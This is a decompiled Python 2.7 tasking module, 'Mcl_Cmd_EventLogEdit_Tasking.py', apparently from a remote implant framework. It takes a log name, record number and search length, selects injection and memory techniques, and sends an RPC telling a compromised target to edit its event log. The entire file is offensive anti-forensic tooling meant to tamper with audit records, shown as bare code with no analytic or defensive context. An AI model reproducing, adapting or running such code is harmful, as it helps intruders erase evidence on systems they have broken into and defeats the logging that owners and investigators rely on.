# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_EventLogEdit_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.eventlogedit', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.eventlogedit.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['logname'] == None or len(lpParams['logname']) == 0:
        mcl.tasking.EchoError('A logfile must be specified')
        return False
    else:
        tgtParams = mca.security.cmd.eventlogedit.Params()
        tgtParams.injectProvider = mcl.tasking.technique.Lookup('EVENTLOGEDIT', mcl.tasking.technique.TECHNIQUE_MCL_INJECT, lpParams['inject'])
        tgtParams.memoryProvider = mcl.tasking.technique.Lookup('EVENTLOGEDIT', mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, lpParams['memory'])
        tgtParams.recnum = lpParams['recnum']
        tgtParams.searchlen = lpParams['searchlen']
        tgtParams.logname = lpParams['logname']
        rpc = mca.security.cmd.eventlogedit.tasking.RPC_INFO_EDIT
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        taskXml = mcl.tasking.Tasking()
        taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, tgtParams.memoryProvider)
        taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_INJECT, tgtParams.injectProvider)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.eventlogedit.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)